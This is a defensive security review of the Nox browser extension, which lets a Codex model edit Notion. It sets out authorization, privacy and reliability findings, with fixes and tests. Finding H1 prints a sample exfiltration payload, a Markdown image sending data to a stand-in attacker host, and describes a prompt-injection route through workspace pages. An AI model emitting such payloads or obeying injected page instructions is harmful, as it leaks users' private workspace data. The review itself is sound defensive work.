# Nox adversarial engineering review

Review date: 2026-09-10. Reviewed revision: `5e49201e7a53e87de63518d4c3a3388e769d0370`.

**Assessment: 4/10 for public engineering-review readiness.** The main blockers are real authorization and privacy defects, not missing polish. Auto can self-authorize structural work; action approvals conceal part of the payload; viewer windows can invoke undo; rendered answers can initiate external image requests; and transient HTTP failures can replay mutations. Passing unit tests do not establish the advertised safety properties.

No Critical finding was established. Five High findings are supported below. Medium and Low findings are ranked within their sections roughly by consequence, not implementation effort. Severity describes the realistic consequence in Nox's intended use; confidence describes the evidence. A model following injected instructions is an assumed threat, not something this review claims to have induced in a live model.

This task changed no implementation. Temporary local probes used synthetic data and mocked transports; they were removed after execution. The report is the only retained repository change.

## Scope, method, and verification

The review followed the production path from panel input through context construction, Codex dynamic requests, planning, approvals, overwrite checks, scheduling, Notion MCP, journaling, and undo. It also inspected the native host and installer, OAuth and token storage, browser messages and permissions, history/attachments, rendering, build and release scripts, tests, and public documentation. Historical planning/spike documents were treated as background evidence, not as current implementation guarantees. Generated bundles and fonts were not independently audited as source code; dependency auditing is not a complete supply-chain assessment.

| Check actually run | Result |
|---|---|
| `pnpm test` in `extension/` | 360 passed; 7 opt-in live tests skipped; 35 files passed, 2 skipped |
| `pnpm typecheck` in `extension/` | Passed |
| `pnpm build` in `extension/` | Passed; Vite 6.4.3 production bundle produced |
| `node bridge/test-bridge.mjs` | Passed, including fake-Codex tool round trip, large messages, crash recovery, restart exhaustion, and configuration redaction |
| `node --test scripts/install.test.mjs scripts/live/answer-quality-eval.test.mjs` | 7 passed |
| `pnpm audit --json` | Exit 1: two moderate package entries for one Vitest advisory; no High/Critical advisory entries |
| `pnpm audit --prod --json` | Passed; no reported production dependency advisories |
| `scripts/package-release.mjs` in an isolated temporary copy of its inputs | Both ZIPs built; distribution contents inspected; existing repository `.release/` left intact |
| Temporary adversarial Vitest probes | 15 passed, asserting the vulnerable/current behaviors described below |
| Targeted tracked-file credential-pattern scan | No matching private-key or selected credential patterns; not an exhaustive secret/history audit |

Environment: Windows, Node `v22.23.2`, reported pnpm `11.10.0`. Tests used the existing installed dependency tree; a clean Linux/macOS install was not performed.

Path convention: shortened `writes/`, `architect/`, `agent/`, `codex/`, `notion/`, `oauth/`, `mcp/`, and `history/` paths refer to `extension/src/lib/`; shortened component filenames refer to `extension/src/sidepanel/`; `tests/` refers to `extension/tests/`. Root documentation, `bridge/`, and `scripts/` retain their repository-relative locations.

The 15 probes covered remote image retention, Auto plan bypass, Ask double approval, malformed plan acceptance, read versus view plan classification, future approve-all authorization, mutation replay, scheduler oversubscription, long Retry-After truncation, unchecked chunk counts, refresh-after-signout, missing-target guard bypass, CRLF SSE parsing, poisoned history persistence queues, and a restored viewer timeline invoking `handleUndo`.

**Not performed:** live OAuth consent, real Notion writes, a real Chrome network capture of the image sink, cross-window browser mutation testing, or a full model-specific Codex isolation matrix. A dependency-free bridge is not an operating-system sandbox. Provider atomicity, cancellation, upload contracts, and model-specific native tool availability require explicit live verification where noted. No private workspace data or credentials were sent to external research tools.

### Live browser follow-up (2026-09-11)

Computer Use inspected the existing Chrome profile and its signed-in Notion tab. The initial attempt ended when the automation tool could not determine the browser URL sufficiently to enforce its policy. After the user made Nox available, a new attempt observed the enabled unpacked Nox extension, version `0.1.0`, and opened its side panel on Notion. The panel progressed from **Connecting...** to **Connected**, reporting `nox/0.154.0 (Windows 10.0.26200; x86_64) unknown (nox; 0.1.0)` and five models available. This verifies visible panel startup and the bridge/model-discovery UI result, not a completed model turn or native-tool isolation.

Nox still displayed **Connect Notion**. A signed-in Notion browser tab does not establish the extension's separate OAuth/MCP connection. Workspace execution tests remain pending user completion of that connection; Computer Use prohibits automating authentication dialogs and acting on permission requests. No workspace objects were created, edited, or deleted. No new vulnerability is inferred from the setup prerequisite. The installed extension's source revision has not been matched to the reviewed commit, so its version label alone must not be used as proof of build identity.

The user subsequently reported completing the Notion connection. The follow-up attempt could not inspect it: Computer Use returned `Computer Use native pipe is unavailable: failed to connect native pipe: The system cannot find the file specified. (os error 2)` on initial window enumeration, a retry after two seconds, and a further attempt after resetting the JavaScript kernel. This is an automation infrastructure blocker, not evidence of a Nox defect. The connection is user-reported, not independently verified by this attempt; no browser input or workspace mutation occurred.

Still pending in the live browser: reads/searches and small edits without mandatory plans; plan approval followed by in-scope actions without duplicate approvals; rejection and out-of-scope deviation handling; two-window ownership and undo; cancellation during writes; conflict detection after an independent edit; malicious synthetic workspace content; and network verification of rendered remote images. The static findings and synthetic probes below are not substitutes for these observations.

### Coverage map

| Area | Principal implementation inspected | Main conclusions |
|---|---|---|
| Extension/runtime | `background/`, `content/`, `sidepanel/`, shared messages and page parser | H4, M10, M13, L3; origin and owner boundaries are not uniformly enforced |
| Codex/native | `lib/codex/`, `agent/loop.ts`, `bridge/` | M11, M12, L4; good turn correlation and no automatic turn replay; isolation remains partially unverified |
| Notion/OAuth | `lib/notion/`, `lib/oauth/`, `lib/mcp/` | H5, M6, M8, M9, M12; no public-client secret needed |
| Tools/approvals/plans | `agent/panel.ts`, `executor.ts`, `architect/`, `writes/` | H2–H4, M1–M5, M14; plan validation is not scoped consent |
| Persistence/undo | `history/`, `writes/journal.ts`, `inverse.ts`, `undo.ts` | H4, M4, M7, M9; crash recovery is incomplete |
| Rendering/privacy | Markdown, composer, activity and log components | H1, H3, M5, M7, M10, L2 |
| Distribution/maintenance | Installer, packaging, CI, lockfile, docs, instructions | M15, L1, L4, L5, D1–D3 |

### Data and authority across boundaries

| Input controller | Receiver/interpreter | Authority and failure behavior |
|---|---|---|
| Notion page author | Content script → background → panel → model | Metadata influences context; it is not execution authority. Remote icon URLs are also browser resource inputs. Validate sender/shape and apply egress policy. |
| Workspace/tool-result author | Codex through wrapped text | Can influence model decisions; delimiters are advisory to the model. Notion writes must be bounded independently of that influence. |
| Codex | Dynamic-tool dispatcher and write gate | Supplies arguments, plans, and proposed effects; cannot legitimately confer its own consent. Malformed input must fail before rendering or transport. |
| User clicking approval | Approval/plan engine | Should authorize exactly the disclosed effect, not omitted payload or a wildcard summary. Cancellation must revoke pending grants. |
| Extension runtime | Native bridge → Codex app-server | The bridge runs a same-user process and relays RPC, not a narrow OS capability sandbox. Exact native origin and restricted client configuration are distinct controls. |
| OAuth/Notion service | Token store, MCP parser, upload handler | Supplies credentials, session data, response text, and upload destinations. Validate each contract; unknown write outcomes require reconciliation, not replay. |
| Browser/OS storage and process lifetime | History/journal and restart paths | Persistence can fail independently of remote writes. Durable intent and explicit pending/unknown outcomes are required for honest recovery. |

## Critical

No Critical issue was established. In particular, this review did not demonstrate unauthenticated remote code execution, direct webpage access to Codex credentials, or arbitrary access to the native host from an ordinary webpage. Do not turn the absence of a demonstrated Critical issue into a claim of complete isolation.

## High

### H1. Sanitized model output can still exfiltrate data through automatic image loads

**Severity:** High. **Confidence:** High for the rendering sink; live Chrome network confirmation remains required.

**Evidence:** `extension/src/lib/markdown.ts:21`, `renderMarkdown`; `extension/src/sidepanel/MessageParts.tsx`, `AssistantMarkdown`; `extension/manifest.config.ts`. DOMPurify's HTML profile retains `img` and HTTPS `src`. The manifest supplies no `img-src` or `default-src` restriction. A local probe of `renderMarkdown('![preview](https://attacker.invalid/collect?data=SECRET)')` retained the complete external image URL.

**Problem:** Removing executable JavaScript does not remove passive outbound requests. Inserting sanitized HTML into the panel loads remote media without a click or a Nox approval. Saved answers are rendered through the same path on history restoration.

**Why it matters:** A malicious workspace page can instruct the model to include an image URL containing private content already in context. If the model complies, the browser sends that content to the URL's operator, including in Ask mode. No workspace mutation or dynamic tool is needed. Even a harmless external image discloses that it was viewed.

**Reproduction / scenario:** Use the synthetic Markdown above in a disposable panel with a controlled endpoint; verify a request occurs on render and on history reopen. The deterministic probe establishes the HTML sink, not a successful live prompt-injection campaign.

**Root cause:** The renderer treats XSS sanitization as sufficient privacy enforcement. Chrome's default extension CSP restricts scripts and objects but does not supply an image destination policy. See the [Chrome CSP reference](https://developer.chrome.com/docs/extensions/reference/manifest/content-security-policy).

**Recommended fix:** Render model-supplied images as non-loading links/placeholders by default. Remove other automatic external media/resource sinks, not just `img.src`. Add an explicit extension-page CSP permitting only needed packaged assets and deliberately supported sources. Any optional remote-image reveal must require a clear user action. Apply a compatible policy to DOM-derived page icons in `Composer.tsx` and `EmptyState.tsx`; do not silently turn Notion page metadata into unrestricted panel fetches.

**Files likely affected:** `lib/markdown.ts`, `manifest.config.ts`, `sidepanel/MessageParts.tsx`, `Composer.tsx`, `EmptyState.tsx`, privacy/security documentation.

**Tests required:** Sanitizer tests for Markdown images, raw `img`, `srcset`, `picture/source`, audio/video/poster, and restored history; a Chrome integration test with a controlled receiver proving zero automatic requests to an unapproved origin. Ordinary HTTPS source links must remain usable.

### H2. Auto plans authorize themselves and bypass the remaining escalation checks

**Severity:** High. **Confidence:** High.

**Evidence:** `extension/src/lib/agent/panel.ts:55` calls `planEngine.request(args, turnAccess.mode() === 'auto')`. `architect/plan-engine.ts`, `request`, immediately sets `approved` in that case. `writes/gate.ts:75` substitutes `{ action: 'allow' }` for `evaluateApproval` whenever a call needs a plan and mode is Auto. `PlanEngine.authorize` matches only tool plus optional target; missing targets are wildcards. It does not compare effects, consume operations, limit object counts, or validate all targets.

**Problem:** The model can create the object that grants it authorization, then bypass out-of-context and untrusted-context checks. A plan saying “add one checkbox” permits arbitrary calls to the same schema tool if `targetId` is omitted. With a target, materially different changes to that target still match. Matching any candidate ID also fails to constrain the complete affected object set or destination.

**Why it matters:** A mistaken or injected model can restructure unrelated workspace objects without user confirmation in Auto. This contradicts the public promise that moves, schema changes, out-of-context changes, and untrusted requests cannot silently write. The 12-call ceiling does not bound objects affected by a bulk call.

**Reproduction / scenario:** The local probe auto-approved a one-operation `notion-update-data-source` plan without a target, then executed two calls against unrelated targets with `provenance: 'untrusted-context'`; no approval callback ran. The operation was reusable. `tests/writes/gate.test.ts` currently positively asserts bypass of untrusted provenance for Auto structural work.

**Root cause:** Plan validation, execution planning, and user authorization are conflated. Freeform model summaries are presented as scope but have no enforceable relationship to arguments.

**Recommended fix:** Separate validated proposals from granted authorization. Auto may proceed without a click only when an independently enforced low-risk action policy permits it; proposing a plan must never waive an escalation. Bind approved operations to canonical tools, actual target sets, destination/parent, material effect constraints, bounded counts, and the current connection/turn. Consume approved operations or explicitly track authorized repetitions. Treat missing target/effect constraints as incomplete scope, not a wildcard. For newly created objects, use result-bound references to the approved creation rather than authorizing every object of that type. Retain separate consent for genuine security-boundary changes.

**Files likely affected:** `architect/plan.ts`, `plan-engine.ts`, `tool.ts`, `agent/panel.ts`, `writes/gate.ts`, `approvals.ts`, `sidepanel/PlanCards.tsx`.

**Tests required:** An Auto proposal cannot authorize an out-of-context move/schema write; arbitrary target omission is refused; altered schema effects and changed destinations require new consent; mixed allowed/unallowed targets fail; a consumed operation cannot be repeated; connection/turn changes expire consent. Also prove one genuinely covered operation executes without redundant approval after an explicit plan approval.

### H3. Action approvals silently omit payload data after 2,000 characters

**Severity:** High. **Confidence:** High.

**Evidence:** `extension/src/lib/writes/approvals.ts:109`: `JSON.stringify(call.args, null, 2).slice(0, 2000)`. `summarizeCall` produces generic labels such as “Replace page content.” `sidepanel/ApprovalCards.tsx` displays only that shortened string in Technical details. The original full `req.args` is later executed by `WriteGate`.

**Problem:** Users cannot inspect everything they are approving. There is no truncation indicator, full-payload view, or complete effect summary. The approval may show neither late targets nor flags following a long content field.

**Why it matters:** A long but plausible page edit can conceal destructive arguments or additional objects beyond the preview. This undermines Ask mode's most important defense against incorrect model decisions and the repeated “exact payload” claim.

**Reproduction / scenario:** Request approval with a content field longer than 2,000 characters followed by another meaningful field. The UI stops inside the first field; clicking Approve executes both. This does not depend on malicious HTML or an XSS.

**Root cause:** A display budget was applied to an authorization artifact without preserving inspectability or checking equivalence between preview and execution.

**Recommended fix:** Keep a complete immutable action payload and make it inspectable. Present a tool-aware summary of targets, counts, changed fields, destructive flags, and reversibility. Long text can collapse, but disclose omission and provide the full diff/payload before approval. Bind the decision to the frozen payload actually executed.

**Files likely affected:** `writes/approvals.ts`, `writes/gate.ts`, `sidepanel/ApprovalCards.tsx`.

**Tests required:** Long content followed by a destructive flag; multiple targets after the current cutoff; full-payload expansion; executed payload identity; clear size-limit refusal if an approval cannot be displayed safely.

### H4. Viewer panels can undo, and undo is not coordinated with active turns

**Severity:** High. **Confidence:** High.

**Evidence:** `extension/src/sidepanel/ChatPanel.tsx:272` always supplies `onUndo` to `ActivityTimeline`, including when `readOnly` is true. `MessageParts.tsx:66` renders an enabled undo button from a restored journal entry. `ChatPanel.undoActivity` invokes `undoEntry` and `writeGate.handleUndo` without checking ownership or `agentBusy`. `ApprovalCards.tsx`, `UndoBar`, likewise does not coordinate with an active turn. `MutationJournal.undoInFlight` is only a per-instance boolean; the Web Lock is acquired only by `claimWindowRole`.

**Problem:** The claimed single-writer boundary is implemented in selected UI controls rather than at mutation execution. The activity timeline provides a second mutation entrance that bypasses it. Viewer instances share stored OAuth tokens even though they do not run connection setup.

**Why it matters:** Another window can write while the owner is working. An owner can also undo an earlier change while a new turn is using it as input. Independent checks and writes can interleave and overwrite one another; duplicate undo claims across panels are not atomic. This is accidental data-loss risk, not a separate-user privilege escalation.

**Reproduction / scenario:** The temporary React test rendered `ChatPanel readOnly` with restored reversible activity, expanded the timeline, clicked “Undo this change,” and observed `handleUndo` called. A real two-window test with synthetic scratch data is still needed to verify the complete browser transport path.

**Root cause:** Role and busy checks live at the composer/toolbar layer; `handleUndo` treats its caller as already authorized and has no shared operation coordinator.

**Recommended fix:** Omit/disable mutation callbacks in viewers and while a turn is active, and enforce owner/busy authorization at the common mutation entry point. Serialize undo with forward writes, using the existing owner runtime; do not add a second independent writer. Make undo claims durable/atomic if more than one runtime may ever reach them. Ensure errors always release claims.

**Files likely affected:** `ChatPanel.tsx`, `MessageParts.tsx`, `ApprovalCards.tsx`, `history/panel.ts`, `writes/gate.ts`, `journal.ts`, `undo.ts`.

**Tests required:** Full restored viewer timeline, not just isolated ApprovalCards; owner turn versus undo; two simultaneous undo attempts from separate journal instances; failed claim storage read; close/reopen during undo; no Notion write outside the owner coordinator.

### H5. Transient-error retries can replay already-applied mutations

**Severity:** High. **Confidence:** High for replay behavior; upstream duplication depends on the failure and tool's semantics.

**Evidence:** `extension/src/lib/notion/index.ts`, `scheduleCallTool`, sends every tool through `Scheduler.schedule`. `mcp/scheduler.ts`, `retryDelayFor`, retries HTTP 5xx/429 and RPC -32001 without knowing whether the operation writes. `McpClient.callTool` creates a new RPC request each attempt. There is no idempotency key or reconciliation. `WriteGate` runs the pre-write guard once outside these retries and journals only the final returned success.

**Problem:** A gateway/server failure after a write committed can trigger another write. Re-executing an overwrite can also run after the original guard is stale.

**Why it matters:** Creating pages/comments, duplicating objects, or applying non-idempotent updates twice causes unwanted permanent workspace changes. Creations have no supported undo. Repeated ambiguous failures can leave changes with no journal entry. Notion deduplication cannot be assumed from a JSON-RPC ID.

**Reproduction / scenario:** A local simulated transport committed its side effect and threw `McpHttpError(503)` on the first attempt. One scheduled call committed twice before returning success. This proves Nox's behavior; it does not claim every Notion 503 follows a commit.

**Root cause:** Transport retry policy is shared between reads and writes, and error status is treated as proof that no effect occurred.

**Recommended fix:** Explicitly classify retry safety. Retry reads; retry mutations only on a provider-documented no-execution response or with provider-supported idempotency. Otherwise report an unknown outcome and reconcile using an operation journal/readback before any user-requested retry. If a retry is safe but delayed, rerun required conflict checks against the applicable baseline.

**Files likely affected:** `notion/index.ts`, `mcp/scheduler.ts`, `mcp/client.ts`, `writes/gate.ts`, `journal.ts`.

**Tests required:** Commit-then-503, response-lost creation, partial bulk success, 429 with documented versus unknown execution semantics, and a concurrent human edit during retry delay. Exactly one side effect or an explicit unresolved outcome must result.

## Medium

### M1. Plan requirements are tied to tool categories, not substantial transformations

**Severity:** Medium. **Confidence:** High.

**Evidence:** `writes/classify.ts:46–81`, `classifyToolCall`/`requiresWorkspacePlan`; `agent/notion-architect.ts`; `writes/gate.ts:66`. Every move, schema operation, and view operation is structural. Any unknown tool is structural. Creating more than five pages requires a plan; other coordinated sequences have no aggregate policy.

**Problem:** Renaming one view or moving one page requires the same plan machinery as a major reorganization. Conversely, many small calls are not accumulated into a meaningful transformation scope. An unrecognized read tool also gets a structural-write response; `notion-query-meeting-notes`, discussed in the repository's capability/spike material, is not in `READ_TOOLS` if offered by the connection.

**Why it matters:** The model's instruction to handle explicit local edits without plans conflicts with the executor. Planning consumes the small tool budget and encourages evasive plans with weak scope. It also fails to recognize substantial work expressed as a series of ordinary calls.

**Reproduction / scenario:** A local probe confirmed `notion-update-view {view_id, name}` needs a plan. `notion-fetch` and `notion-search` do not, regardless of how many pages were already read. **There is no page-read-count plan threshold in this code.** For the reported “read a few additional pages” symptom, capture the actual denied tool: a known read is not blocked by `requiresWorkspacePlan`; an unknown read or voluntary model plan is a different cause.

**Root cause:** Risk, mutation classification, and plan necessity are compressed into one `structural` bit.

**Recommended fix:** Keep mutation classification separate from planning. Maintain verified read-tool classifications as the MCP surface evolves. Require plans for material multi-object transformations, destructive schema effects, broad moves, or operations whose combined scope merits review. Permit isolated low-risk changes through action approval alone. Treat unknown tools conservatively with an explicit unsupported-effect/approval policy, not an invented architectural plan requirement. Track cumulative authorized effects within the turn when scope is distributed across calls. Do not infer safety solely from a tool's name or untrusted annotations.

**Files likely affected:** `writes/classify.ts`, `gate.ts`, `architect/`, `agent/notion-architect.ts`, dynamic-tool discovery.

**Tests required:** Reads/search/continuations never require a plan; one view rename and one isolated property edit need only ordinary policy; destructive schema change, many-object move, and coordinated effects require a meaningful scoped plan; newly discovered unknown tools fail clearly without pretending a read is structural.

### M2. Ask mode double-approves plans; production Auto unnecessarily approves ordinary edits

**Severity:** Medium. **Confidence:** High.

**Evidence:** `writes/gate.ts:75–86` consults the action engine after successful plan authorization except in Auto. `evaluateApproval` always adds a reason in Ask mode. Separately, `ChatPanel.tsx:218` always supplies `prepareContext`, including when mentions are empty. `AgentLoop.runUserMessage` sets `untrustedContextThisTurn` from `!!opts.prepareContext`; every subsequent tool also sets it true. `evaluateApproval` requests approval for that provenance.

**Problem:** Explicit approval of a plan does not grant action consent in Ask. Meanwhile, in the production panel even the first ordinary Auto write has untrusted provenance because an empty preparation callback exists. Tests of a bare `WriteGate` with omitted provenance miss this assembly behavior.

**Why it matters:** Users encounter both redundant plan/action cards and an Auto mode that frequently behaves like Ask for small edits, while H2 permits more dangerous structural edits without cards. This inversion incentivizes “approve all” and weakens attention to meaningful escalations.

**Reproduction / scenario:** The local probe approved an Ask plan then observed a second action approval. Trace a no-mention panel turn: `prepareContext` is truthy before any read. Any local content/property edit reaches the untrusted-context reason.

**Root cause:** No single representation of inherited authorization; provenance is approximated by callback presence and all tool outputs, including Nox's own plan results.

**Recommended fix:** First implement H2's enforceable scope. Let Ask plan consent satisfy ordinary action approval only for materially covered actions. Keep provenance as data origin, not authorization, and base it on actual context exposure. Removing a redundant card must not remove target/effect checks or make model text an authority grant. See the policy section below for the full lifecycle.

**Files likely affected:** `ChatPanel.tsx`, `agent/loop.ts`, `agent/panel.ts`, `writes/approvals.ts`, `gate.ts`, `architect/plan-engine.ts`.

**Tests required:** Real production assembly with zero mentions, one mention, and a read-then-write sequence; explicitly approved Ask plan runs its bounded actions once; deviation re-prompts; Auto low-risk work follows one consistent policy and Auto never waives escalations through a plan.

### M3. Overwrite protection can proceed without an established, successful read baseline

**Severity:** Medium. **Confidence:** High for the branches; live MCP shape compatibility needs verification.

**Evidence:** `writes/gate.ts`, `handleRequest`: snapshotting occurs only when `page_id` or `data.page_id` is found; missing targets do not abort. `expectedHash` is optional. `agent/panel.ts:39`, `fetchPageMarkdown`, concatenates result text without checking `isError`. A regular `notion-fetch` read is remembered before the assembly rejects `isError`. Read hashes are not persisted across panel restart. `guard.ts` compares two reads without a conditional write.

**Problem:** A model can write without a read it actually saw. After reopening a persisted Codex conversation, stale model content can be used with no retained expected hash. Error text can be treated as a snapshot. An unrecognized target shape skips the guard entirely.

**Why it matters:** “Unchanged between two fresh checks” does not mean “unchanged since the model based its edit on this page.” The user may approve an edit without seeing intervening changes. Lack of a per-target write critical section also permits two Nox writes to pass checks before either executes.

**Reproduction / scenario:** Reopen a conversation, externally edit the page, then let the model replace it from retained context without fetching. Both fresh snapshots agree with each other, but are unrelated to the model's baseline. The local malformed-target probe reached the transport with zero snapshots; whether that particular shape is accepted by Notion is not asserted.

**Root cause:** Best-effort target extraction and optional in-memory hashes stand in for a required validated read dependency.

**Recommended fix:** Parse supported mutation shapes once; reject unknown/missing targets before execution. Require a successful, sufficiently complete read baseline for replacement and re-read on resumed sessions when none exists. Reject tool-declared fetch errors. Compare normalized content extracted from the actual Notion response, not arbitrary concatenated envelopes. Serialize Nox writes to the same target across guard and execution. Clearly document the unavoidable final race with external editors when Notion provides no conditional write.

**Files likely affected:** `writes/gate.ts`, `guard.ts`, `agent/panel.ts`, Notion response normalization, journal/read-state handling.

**Tests required:** Missing target, tool-error snapshots, resumed stale context, wrapper/partial fetch fixtures, two simultaneous writes to the same page, and human edits before versus after the last read. Reject unknown completeness for destructive replacement rather than assuming it is a full pre-image.

### M4. The journal is written after mutation and cannot account for crash-time outcomes

**Severity:** Medium. **Confidence:** High.

**Evidence:** `writes/gate.ts:127–163` executes before `journal.record`, with additional post-write reads before recording. Journal failures only log to the console. `JournalEntry.status` has no pending/unknown state. `history/restore.ts` can recover only existing entries. `undo.ts` writes `undone` only after its remote operation completes.

**Problem:** Closing/crashing the panel between remote commit and local record leaves a real change absent from the journal. An aborted HTTP request does not prove the server rolled back. Journal disk failure is hidden from the action outcome.

**Why it matters:** A stopped/failed turn can contain unreported changes and no recovery material. Users may retry work that already happened. “Journal intact for undo” is not established by the current persistence ordering.

**Reproduction / scenario:** Commit a fake remote mutation, then terminate before `journal.record` or make `append` fail. Reopen: no mutation entry exists. Existing `gate.test.ts` explicitly accepts successful tool output after journal failure.

**Root cause:** The journal is a post-success activity log, not a durable operation ledger.

**Recommended fix:** Before sending a mutation, persist operation identity, authorization scope, target, and necessary pre-image as pending. If that fails, stop before the mutation. Record applied/failed/unknown based on what is actually known. On restart, surface unresolved operations and reconcile before replay/undo. If post-commit persistence fails, return a visible “applied, recovery record failed” outcome rather than plain success. Capture journal thread/turn IDs when queuing the record, not from mutable scope at later execution.

**Files likely affected:** `writes/journal.ts`, `gate.ts`, `undo.ts`, `history/restore.ts`, activity UI.

**Tests required:** Crash at each boundary around request, response, verification, and journal update; cancellation after server commit; disk full before versus after write; undo committed but local status update failed; recovery never silently replays an unknown operation.

### M5. Local file upload bypasses the write gate and trusts any HTTPS ticket destination

**Severity:** Medium. **Confidence:** High for the bypass; destination compatibility requires live verification.

**Evidence:** `agent/panel.ts:60–74` handles `nox-upload-local-file` before `WriteGate`, calls `notion-create-file-upload` directly, and sends the blob through global `fetch`. `attachments/upload-tool.ts` checks only `new URL(uploadUrl).protocol === 'https:'`; it does not validate origin or reject a tool-error ticket. The upload tool is advertised unconditionally by `toDynamicTools`.

**Problem:** Selecting a file authorizes model access to that ID but becomes sufficient to upload it, even in Ask mode or when the user asked a question about the file. Ticket creation bypasses the underlying capability check, approvals, and mutation journal. HTTPS establishes transport protection, not an approved recipient.

**Why it matters:** A model mistake can disclose a selected file before the page-edit approval appears. A malformed/untrusted ticket can direct the blob to another HTTPS endpoint if browser network policy permits it. No arbitrary local-file read was found: current-turn attachment-ID checking is a real boundary.

**Reproduction / scenario:** Attach a document, ask about it without requesting upload, and simulate a dynamic upload call. It reaches ticket creation with no Ask card. Feed an HTTPS URL outside Notion as a synthetic ticket; the helper attempts the POST. No real file was uploaded in this review.

**Root cause:** A convenience Nox-only tool was excluded from the mutation/egress policy rather than given an explicit upload policy.

**Recommended fix:** Treat file upload as a first-class external effect with selected-file identity, destination, capability, consent, and journal outcome. Inherit consent only from an explicit upload request/approved operation. Validate the actual provider ticket contract and documented upload origins; reject unexpected redirects and error results. Advertise the upload tool only when the required provider capability is supported.

**Files likely affected:** `agent/panel.ts`, `attachments/upload-tool.ts`, `agent/dynamic-tools.ts`, approval/journal components, manifest and privacy docs.

**Tests required:** Ask upload consent, attachment selected but upload not requested, unavailable underlying capability, wrong origin, redirect, `isError` ticket, cancellation after ticket creation, and partial upload outcomes.

### M6. The scheduler does not enforce its advertised combined rate/concurrency rules

**Severity:** Medium. **Confidence:** High.

**Evidence:** `mcp/scheduler.ts`, `acquire`, checks concurrency before entering the token-wait loop and never rechecks after waiting. Search consumes only the search bucket, not global tokens. `clampBackoff` caps even explicit Retry-After at 30 seconds.

**Problem:** Multiple rate waiters can later enter while other calls remain active. Search adds traffic beyond the global budget. A server asking for 120 seconds receives another request after 30 seconds.

**Why it matters:** Long-running requests or bulk work can overrun concurrency, intensify throttling, and spend the small retry budget during a mandated cooldown. This also widens the guard-to-write interval.

**Reproduction / scenario:** With `maxConcurrent: 1` and `globalRps: 1`, drain the initial token, queue three blocked long-running tasks, and advance time. The local probe reached concurrency 3. `retryDelayFor(429, Retry-After=120)` returned 30,000 ms. The existing “shares tokens across both buckets” test asserts only that a call occurs; it does not measure shared token consumption.

**Root cause:** Separate admission checks are not reserved/revalidated together; exponential-backoff caps are reused for server minimum delays.

**Recommended fix:** Admit a request only when it can reserve both concurrency and every applicable rate budget. Recheck after each wait and release exactly once. Search must consume both budgets. Treat valid Retry-After as a minimum; if it exceeds the remaining deadline, report that instead of retrying early. Check cancellation again immediately before invoking the operation.

**Files likely affected:** `mcp/scheduler.ts`, `notion/index.ts`.

**Tests required:** Slow operations plus token waiters under production and reduced limits; mixed search/global traffic with exact timestamps; Retry-After over 30 seconds and HTTP-date form; cancellation at admission/release boundaries; no permit leaks.

### M7. Removing files or deleting a thread leaves attachment bytes behind

**Severity:** Medium. **Confidence:** High.

**Evidence:** `Composer.tsx:398` saves files without a `threadId`. Removing a chip at line 307 only changes React state. Sending clears the attachment list but does not attach stored rows to the new thread. `history/repository.ts:81` deletes threads/messages/journal, not attachments. `attachmentRepository.removeForThread` exists but has no production caller.

**Problem:** Files become orphaned durable records as soon as selected, including files removed before Send. Thread deletion cannot identify or delete them.

**Why it matters:** Private file contents remain after users reasonably believe the attachment or conversation was deleted. Unlimited storage makes accumulation less visible; only deleting all data or uninstalling clears these records.

**Reproduction / scenario:** Select a file, remove its chip, and inspect the attachments store; the row remains. Send an attachment, delete the thread, and observe the same behavior.

**Root cause:** Draft attachment lifecycle, message linkage, and deletion were not connected to the persistence model.

**Recommended fix:** Track draft attachment ownership; remove abandoned files; attach selected IDs to the persisted turn/thread before sending; delete thread-owned blobs with the thread in one transaction. Decide whether exports include attachment metadata and state that behavior. Bound aggregate attachment selection and explain rejected oversized files instead of silently filtering them.

**Files likely affected:** `Composer.tsx`, `ChatPanel.tsx`, `history/attachments.ts`, `repository.ts`, `schema.ts`, `turn.ts`, `PRIVACY.md`.

**Tests required:** Remove before send, cancel draft, new chat, failed send, delete attached thread, multiple attachments, and no deletion of files still referenced by another retained message.

### M8. Sign-out races with refresh and revocation can delay deletion indefinitely

**Severity:** Medium. **Confidence:** High.

**Evidence:** `oauth/tokens.ts`, `doRefresh`, `writeTokens`, `signOut`, `wipe`. Refresh has a per-instance single-flight promise but no credential-generation check or cancellation on wipe. Sign-out waits for revocation before clearing storage and gives that request no timeout. Metadata-driven initial exchange contrasts with hardcoded refresh endpoint `/token`.

**Problem:** A refresh started before sign-out can write new credentials after the stores were cleared. An unresponsive revocation endpoint can prevent local sign-out from completing. The single-flight guarantee also does not cover separate panel instances.

**Why it matters:** “Disconnected” does not reliably mean credentials remain deleted. Reopening can restore a session the user ended. Viewer undo (H4) adds a concrete second runtime capable of using/refreshing the same token.

**Reproduction / scenario:** The probe paused refresh at the response, completed `signOut({})`, then released a successful refresh response. `hasRefreshToken()` became true again.

**Root cause:** Credential writes are not scoped to an active authorization generation; revocation and local credential disposal have the wrong dependency.

**Recommended fix:** Invalidate the credential generation and clear local/session credentials promptly on sign-out. Abort outstanding refresh where possible and reject late writes from old generations. Revoke a captured token with a bounded timeout. Serialize refresh across any permitted callers. Use validated discovered token metadata consistently. Describe durable-first storage as reducing a crash window, not making server rotation and local persistence atomic.

**Files likely affected:** `oauth/tokens.ts`, `notion/index.ts`, `notion/panel.ts`, connection UI.

**Tests required:** Refresh completes after wipe/signout, refresh races with a new login, two instances refresh, hung revocation, invalid grant, and storage failure after server rotation. Old authorization must never resurrect.

### M9. IndexedDB connections accumulate and another panel can block data deletion indefinitely

**Severity:** Medium. **Confidence:** High.

**Evidence:** `history/schema.ts`, `openNoxDB`, opens a new connection per call, adds every connection to a strong `Set`, and closes them only in local `closeNoxDBConnections`. It supplies no `blocking`/version-change close handler. `history/panel.ts`, `deleteAllData`, deliberately waits on blocked deletion. `UndoBar` polls `journal.undoable()` every three seconds, which opens another connection and reads the entire journal.

**Problem:** Routine operations retain unbounded connection objects. A viewer's open database connections are unaffected by the owner's local close function and can keep Delete all data or future migrations blocked. Tokens are cleared only after deletion succeeds.

**Why it matters:** An ordinary multi-window session can make the data deletion UI spin indefinitely. Long-lived panels accumulate connections and repeatedly load all mutation payloads, including inverse content.

**Reproduction / scenario:** Open history in two panels; choose Delete all data in the owner and keep the viewer open. Its connections receive a version-change/delete request but no application handler closes them.

**Root cause:** The repository factory treats the database accessor as a connection factory with no normal disposal lifecycle, and deletion coordination is only local to one document.

**Recommended fix:** Cache one connection/open promise per panel, close/reset it on version change, and coordinate deletion across panels with a small explicit message. Surface a blocked-deletion explanation if another context fails to close. Query scoped journal entries/counts through existing indexes instead of polling all records. Do not hold token deletion hostage to a blocked database operation.

